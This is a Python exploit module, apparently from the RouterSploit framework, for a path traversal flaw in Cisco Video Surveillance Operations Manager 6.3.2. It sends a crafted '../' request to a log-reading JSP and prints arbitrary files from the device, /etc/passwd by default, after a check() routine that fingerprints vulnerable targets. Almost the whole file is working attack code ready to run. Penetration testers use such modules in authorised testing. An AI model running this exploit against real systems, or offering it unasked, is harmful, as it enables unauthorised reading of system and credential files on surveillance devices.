from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Cisco Video Surveillance Path Traversal",
        "description": "Module exploits path traversal vulnerability in Cisco Video Surveillance Operations Manager 6.3.2 devices. "
                       "If the target is vulnerable it allows to read files from the filesystem.",
        "authors": (
            "b.saleh",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38389/",
        ),
        "devices": (
            "Cisco Video Surveillance Operations Manager 6.3.2",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from the filesystem")

    def run(self):
        if self.check():
            path = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response and response.status_code == 200 and len(response.text):
                print_success("Exploit success")
                print_status("Reading file: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read file")
        else:
            print_error("Exploit failed - device seems to be not vulnerable")

    @mute
    def check(self):
        path = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd"

        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
